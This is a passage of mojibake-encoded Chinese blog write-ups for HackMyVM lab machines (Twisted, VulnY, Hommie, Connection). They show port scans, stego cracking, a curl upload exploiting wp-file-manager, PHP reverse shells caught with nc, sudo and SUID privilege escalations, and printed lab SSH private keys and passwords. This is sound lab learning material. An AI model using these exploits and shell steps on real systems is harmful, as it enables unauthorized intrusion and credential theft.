æœ‰æ³¨é‡Špaulå¯èƒ½æ˜¯sshçš„è´¦å·ï¼Œrelax.wavä¸‹è½½ä¸‹äº†ä¹‹åæ²¡æœ‰ä¸œè¥¿ï¼Œ/bootstrap.min.cssç»™äº†ä¸€ä¸ªwavæ–‡ä»¶ï¼Œç”¨Audacityåˆ†æé¢‘è°±èƒ½å‘ç°dancingpassyoï¼Œsshç™»å½•è¯•è¯•ï¼Œç™»å½•æˆåŠŸ ææƒ1234567paul@MiWiFi-RA71-srv:~$ sudo -lsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostnameMatching Defaults entries for paul on MiWiFi-RA71-srv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser paul may run the following commands on MiWiFi-RA71-srv: (ALL : ALL) NOPASSWD: /usr/bin/ln 1234paul@MiWiFi-RA71-srv:~$ sudo ln -fs /bin/sh /bin/usr/lnsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname# iduid=0(root) gid=0(root) groups=0(root) ææƒæˆåŠŸ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Twisted","slug":"HackmyVM-Twisted","date":"2025-01-24T07:12:50.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/01/24/HackmyVM-Twisted/","permalink":"https://lvzhouhang.xyz/2025/01/24/HackmyVM-Twisted/","excerpt":"","text":"ä¿¡æ¯æœé›†1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.22 08:00:27:63:fe:59 PCS Systemtechnik GmbH192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded ipä¸º192.168.31.22. nmapæ‰«æç«¯å£ 1234567891011121314â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.22 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 ESTStats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)Nmap scan report for twisted (192.168.31.22)Host is up (0.0065s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http2222/tcp open EtherNetIP-1MAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds 2222ç«¯å£ä¸ºsshç«¯å£ 80ç«¯å£123456789â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl 192.168.31.22&lt;h1&gt;I love cats!&lt;/h1&gt;&lt;img src=&quot;cat-original.jpg&quot; alt=&quot;Cat original&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;&lt;br&gt;&lt;h1&gt;But I prefer this one because seems different&lt;/h1&gt;&lt;img src=&quot;cat-hidden.jpg&quot; alt=&quot;Cat Hidden&quot; width=&quot;400&quot; height=&quot;400&quot;&gt; 80ç«¯å£å­˜åœ¨ä¸¤å¼ jpgå›¾ç‰‡ ä¸‹è½½ä¸‹äº†ç”¨stegseekæŸ¥çœ‹ 12345678910111213141516â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# stegseek cat-original.jpgStegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: &quot;westlife&quot;[i] Original filename: &quot;markus.txt&quot;.[i] Extracting to &quot;cat-original.jpg.out&quot;.â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# stegseek cat-hidden.jpgStegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: &quot;sexymama&quot;[i] Original filename: &quot;mateo.txt&quot;.[i] Extracting to &quot;cat-hidden.jpg.out&quot;. ç»™äº†ä¸¤ä¸ªsshçš„è´¦å·å¯†ç  ææƒå…ˆç™»å½•markus 1234markus@MiWiFi-RA71-srv:~$ cat note.txtHi bonita,I have saved your id_rsa here: /var/cache/apt/id_rsaNobody can find it. ç»™äº†ä¸€ä¸ªæç¤ºï¼Œæ˜¯bonitaç”¨æˆ·çš„id_rsa suidææƒçœ‹çœ‹ 12345678910111213markus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null/home/bonita/beroot/usr/bin/su/usr/bin/umount/usr/bin/gpasswd/usr/bin/passwd/usr/bin/mount/usr/bin/chfn/usr/bin/chsh/usr/bin/newgrp/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device /home/bonita/berootè¿™ä¸ªå¾ˆå¯ç–‘ä½†æ˜¯æ²¡æœ‰æƒé™ï¼Œç™»å½•mateoçœ‹çœ‹ 12mateo@MiWiFi-RA71-srv:~$ cat note.txt/var/www/html/gogogo.wav ä¸‹è½½ä¸‹äº†ï¼Œç”¨AudacityæŸ¥çœ‹ï¼Œèƒ½å‘ç°è¿™æ˜¯è«æ–¯ï¼Œè§£ç å¾—åˆ° 1GO DEEPER... COME WITH ME... LITTLE RABBIT... æ²¡å•¥ç”¨ 123mateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_raw+ep/usr/bin/tail = cap_dac_read_search+ep getcapå¯ä»¥æŸ¥çœ‹æ–‡ä»¶çš„ç‰¹æ®Šæƒé™ï¼Œtailå¯ä»¥è¯»å– 12345678910111213141516171819202122232425262728mateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zdFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBSolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcFgFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5Ctt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGMgl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVCxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9HuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyDXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvuU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gImZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutronxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXKmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtqyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSPUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjhV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rza0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKFeERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTituD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==-----END OPENSSH PRIVATE KEY----- sshç™»é™†ï¼Œå°†berootä¸‹è½½idaåˆ†æ 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+1Ch] [rbp-4h] BYREF printf(&quot;Enter the code:\\n &quot;); scanf(&quot;%i&quot;, &amp;v4); if ( v4 == 5880 ) &#123; setuid(0); setgid(0); system(&quot;/bin/bash&quot;); &#125; else &#123; puts(&quot;\\nWRONG&quot;); &#125; return 0;&#125; åªè¦è¾“å…¥ç­‰äº5880å°±ä¼šæ‰§è¡Œ/bin/bash 1234bonita@MiWiFi-RA71-srv:~$ ./berootEnter the code: 5880root@MiWiFi-RA71-srv:~# ææƒç»“æŸ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-VulnY","slug":"HackmyVM-VulnY","date":"2025-01-24T05:17:41.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/01/24/HackmyVM-VulnY/","permalink":"https://lvzhouhang.xyz/2025/01/24/HackmyVM-VulnY/","excerpt":"","text":"ä¿¡æ¯æœé›†123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.165 08:00:27:6c:16:9b PCS Systemtechnik GmbH192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 4 responded ipä¸º192.168.31.165 ï¼Œnmapæ‰«æç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.165 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 00:19 ESTNmap scan report for vulny (192.168.31.165)Host is up (0.049s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http33060/tcp open mysqlxMAC Address: 08:00:27:6C:16:9B (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 28.56 seconds å¼€äº†ä¸€ä¸ªmysqlæœåŠ¡å’Œhttpçš„æœåŠ¡ 80ç«¯å£æ‰«æç›®å½•èƒ½æ‰«å‡ºæ¥æœ‰ä¸€ä¸ªsecretçš„ç›®å½• 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl http://192.168.31.165/secret/Neither &lt;b&gt;/etc/wordpress/config-192.168.31.165.php&lt;/b&gt; nor &lt;b&gt;/etc/wordpress/config-168.31.165.php&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username æç¤ºäº†è¦å»çœ‹/etc/wordpress/config-168.31.165.phpï¼Œå¯ä»¥çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªwordpressçš„æ¡†æ¶ï¼Œwp-contentå­˜åœ¨ç›®å½•éå† åœ¨Index of /secret/wp-content/uploads/2020/10è¿™é‡Œèƒ½å‘ç°ä¸€ä¸ªå‹ç¼©åŒ…wp-file-manager-6.O.zipï¼Œè¿™ä¸ªæ’ä»¶å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼  1curl -F cmd=upload -F target=l1_ -F upload[]=@rev.php -XPOST &quot;http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot; ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„æ–‡ä»¶ è®¿é—®http://192.168.31.165/secret/wp-content/plugins/wp-file-manager/lib/files/rev.php è¿›è¡Œåå¼¹shell 12$ iduid=33(www-data) gid=33(www-data) groups=33(www-data) ææƒcdè¿›/etc/wordpressï¼Œ 123www-data@vulny:/etc/wordpress$ lslsconfig-192.168.1.122.php htaccess æ–‡ä»¶åå’Œ80ç«¯å£çš„ä¸ä¸€æ ·ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯80ç«¯å£æ˜¯ipåœ°å€è¾“å‡ºçš„æ–‡ä»¶å 12345678910www-data@vulny:/etc/wordpress$ cat c*cat c*&lt;?phpdefine(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);define(&#x27;DB_USER&#x27;, &#x27;wordpress&#x27;);define(&#x27;DB_PASSWORD&#x27;, &#x27;myfuckingpassword&#x27;);define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);define(&#x27;DB_COLLATE&#x27;, &#x27;utf8_general_ci&#x27;);define(&#x27;WP_CONTENT_DIR&#x27;, &#x27;/usr/share/wordpress/wp-content&#x27;);?&gt; ç»™äº†mysqlçš„è´¦å·å¯†ç ï¼Œè¿™è¿˜æœ‰wordpressçš„è·¯å¾„ï¼ŒæŸ¥çœ‹wp-config.phpæœ‰ä¸€è¡Œæ³¨é‡Šå¾ˆçªå‡º 1/* idrinksomewater */ ç™»å½•mysqlï¼Œæ‰¾ä¸åˆ°æœ‰ç”¨çš„ä¸œè¥¿ æŸ¥çœ‹/etc/passwdæœ‰ä¸€ä¸ªadrianå¯ä»¥ç™»å½•ï¼Œæ³¨é‡Šå°±æ˜¯å¯†ç  12345www-data@vulny:/usr/share/wordpress$ su adriansu adrianPassword: idrinksomewateradrian@vulny:/usr/share/wordpress$ 12345678adrian@vulny:/$ sudo -lsudo -lMatching Defaults entries for adrian on vulny: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser adrian may run the following commands on vulny: (ALL : ALL) NOPASSWD: /usr/bin/flock 123adrian@vulny:/$ sudo -u root /usr/bin/flock -u / /bin/bashsudo -u root /usr/bin/flock -u / /bin/bashroot@vulny:/ ææƒæˆåŠŸ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Hommie","slug":"HackmyVM-Hommie","date":"2025-01-23T11:28:47.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/23/HackmyVM-Hommie/","permalink":"https://lvzhouhang.xyz/2025/01/23/HackmyVM-Hommie/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.116 08:00:27:26:b1:6f PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered) ipä¸º192.168.31.116ï¼Œnmapæ‰«æç«¯å£ 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.116 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:29 ESTNmap scan report for hommie (192.168.31.116)Host is up (0.00041s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds 80ç«¯å£12345â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl 192.168.31.116alexia, Your id_rsa is exposed, please move it!!!!!Im fighting regarding reverse shells!-nobody 80ç«¯å£ç›®å½•ä¹Ÿæ‰«æä¸åˆ°ï¼Œåªç»™äº†ä¸€ä¸ªæç¤ºï¼Œalexiaçš„id_rsaæ³„éœ²äº†ï¼Œå»çœ‹21ç«¯å£ 21ç«¯å£12345678910111213141516171819202122232425262728293031â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ftp anonymous@192.168.31.116Connected to 192.168.31.116.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||35772|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 0 Sep 30 2020 index.html226 Directory send OK.ftp&gt; ls -al229 Entering Extended Passive Mode (|||35347|)150 Here comes the directory listing.drwxr-xr-x 3 0 113 4096 Sep 30 2020 .drwxr-xr-x 3 0 113 4096 Sep 30 2020 ..drwxrwxr-x 2 0 113 4096 Jan 23 06:12 .web-rw-r--r-- 1 0 0 0 Sep 30 2020 index.html226 Directory send OK.ftp&gt; cd .web250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||27864|)150 Here comes the directory listing.-rw-r--r-- 1 106 113 35 Jan 23 06:12 1.phtml-rw-r--r-- 1 0 0 99 Sep 30 2020 index.html-rw-r--r-- 1 106 113 5493 Jan 23 06:09 rev.php226 Directory send OK. 21ç«¯å£æœ‰åŒ¿åç™»å½•ï¼Œå­˜åœ¨.webç›®å½•ï¼Œå¯ä»¥å¾€80ç«¯å£ä¼ æ–‡ä»¶ï¼Œä½†æ˜¯ä¸è§£æphpï¼Œåªèƒ½æ”¾å¼ƒ tftpæ‰«æudpç«¯å£ 123456789101112131415161718192021222324252627282930â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.116 --min-rate=1000 -sU --top-ports 20Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 06:34 ESTNmap scan report for hommie (192.168.31.116)Host is up (0.00053s latency).PORT STATE SERVICE53/udp closed domain67/udp open|filtered dhcps68/udp open|filtered dhcpc69/udp open|filtered tftp123/udp open|filtered ntp135/udp closed msrpc137/udp open|filtered netbios-ns138/udp open|filtered netbios-dgm139/udp open|filtered netbios-ssn161/udp closed snmp162/udp open|filtered snmptrap445/udp open|filtered microsoft-ds500/udp open|filtered isakmp514/udp closed syslog520/udp open|filtered route631/udp open|filtered ipp1434/udp open|filtered ms-sql-m1900/udp open|filtered upnp4500/udp open|filtered nat-t-ike49152/udp open|filtered unknownMAC Address: 08:00:27:26:B1:6F (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds tftpçš„æœåŠ¡å¼€ç€ï¼Œç»“åˆ80ç«¯å£ç»™çš„æç¤º 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# tftp 192.168.31.116tftp&gt; get id_rsa å¯ä»¥ä¸‹è½½ä¸‹æ¥alexiaçš„id_rsa sshç™»å½• ææƒæ‰¾æœ‰suidçš„å‘½ä»¤ 12345678910111213alexia@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null/opt/showMetheKey/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/bin/gpasswd/usr/bin/chfn/usr/bin/su/usr/bin/mount/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/umount /opt/showMetheKeyå¾ˆå¯ç–‘å•Š,è¿è¡Œä¸€ä¸‹ 12345678910111213141516171819202122232425262728alexia@MiWiFi-RA71-srv:~$ /opt/showMetheKey-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0yRn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOTgCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309jQMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBqkyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbIM2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjMdgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZWrH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0BtIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5Td/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiEUa47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2wpmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtkWeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jzbu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO60boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9zHlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbsy6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtYOZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gppivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==-----END OPENSSH PRIVATE KEY----- æŠŠalexiaçš„id_rsaè¾“å‡ºäº†ï¼Œå°†è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ‹–ä¸‹æ¥æ”¾è¿›idaçœ‹çœ‹ 1234567int __fastcall main(int argc, const char **argv, const char **envp)&#123; setuid(0); setgid(0); system(&quot;cat $HOME/.ssh/id_rsa&quot;); return 0; ä»–æ˜¯æŸ¥çœ‹ç¯å¢ƒå˜é‡é‡ŒHOMEå˜é‡ä¸‹çš„.ssh/id_rsa,å¯ä»¥ä¿®æ”¹HOMEå˜é‡è¯»å–rootçš„id_rsa 1234567alexia@MiWiFi-RA71-srv:~$ export HOME=/rootalexia@MiWiFi-RA71-srv:/home/alexia$ envSHELL=/bin/bashPWD=/home/alexiaLOGNAME=alexiaXDG_SESSION_TYPE=ttyHOME=/root å†æ¬¡è¿è¡Œæ‹¿åˆ°rootçš„id_rsaï¼Œç™»å½•å³å¯","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Connection","slug":"HackmyVM-Connection","date":"2025-01-22T14:07:19.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-Connection/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Connection/","excerpt":"","text":"ä¿¡æ¯æœé›†123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.77 08:00:27:2a:5f:aa PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded ipä¸º192.168.31.77ï¼Œnmapæ‰«æç«¯å£ 1234567891011121314â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]â””â”€# nmap 192.168.31.77 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 ESTNmap scan report for connection (192.168.31.77)Host is up (0.00064s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http139/tcp open netbios-ssn445/tcp open microsoft-dsMAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds 445ç«¯å£å¼€å¯äº†445ç«¯å£ ç”¨enum4linuxè¿›è¡Œæšä¸¾ 1234567891011121314151617181920212223242526 =================================( Share Enumeration on 192.168.31.77 )================================= Sharename Type Comment --------- ---- ------- share Disk print$ Disk Printer Drivers IPC$ IPC IPC Service (Private Share for uploading files)Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP CONNECTION[+] Attempting to map shares on 192.168.31.77//192.168.31.77/share Mapping: OK Listing: OK Writing: N/A//192.168.31.77/print$ Mapping: DENIED Listing: N/A Writing: N/A[E] Can&#x27;t understand response:NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*//192.168.31.77/IPC$ Mapping: N/A Listing: N/A Writing: N/A smbclintå¯ä»¥åŒ¿åç™»é™†shareé‡Œæœ‰ä¸€ä¸ªhtmlï¼Œéšä¾¿å¾€é‡Œä¼ ä¸€ä¸ªæ–‡ä»¶å‘ç°åœ¨80ç«¯å£è®¿é—®åˆ°ï¼Œä¼ ä¸€ä¸ªåå¼¹shellçš„phpæ–‡ä»¶ 123456789â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]â””â”€# smbclient //192.168.31.77/sharePassword for [WORKGROUP\\root]:Anonymous login successfulsmb: \\&gt; cd html\\smb: \\html\\&gt;smb: \\html\\&gt; put rev.phpputting file rev.php as \\html\\rev.php (447.0 kb/s) (average 447.0 kb/s)smb: \\html\\&gt; exit 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/script]â””â”€# nc -lvnp 5555listening on [any] 5555 ...connect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux 09:12:44 up 4 min, 0 users, load average: 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ æ¥æ”¶åˆ°shelläº† 